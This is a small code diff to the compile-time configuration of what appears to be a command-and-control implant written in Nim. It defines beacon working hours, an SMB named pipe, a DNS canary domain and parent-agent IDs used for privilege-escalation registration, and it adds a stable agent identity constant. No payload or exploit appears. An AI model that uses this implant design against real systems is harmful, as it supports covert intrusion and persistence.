@@ -12,4 +12,5 @@ const WorkingHours*   {.strdefine.} = ""  # "HH:MM-HH:MM", empty = always beacon
 const SMBPipe*     {.strdefine.} = "endgamepipe"  # named pipe for smb transport
 const CanaryDomain* {.strdefine.} = ""           # DNS canary domain (canary.<domain> resolved at startup)
 const buildName*    {.strdefine.} = ""           # canonical build filename baked in at compile time
-const ParentID*     {.strdefine.} = ""           # parent agent ID for direct privesc registration
+const ParentID*      {.strdefine.} = ""           # parent agent ID for direct privesc registration
+const AgentPresetID* {.strdefine.} = ""           # compile-time stable identity embedded by server at build time
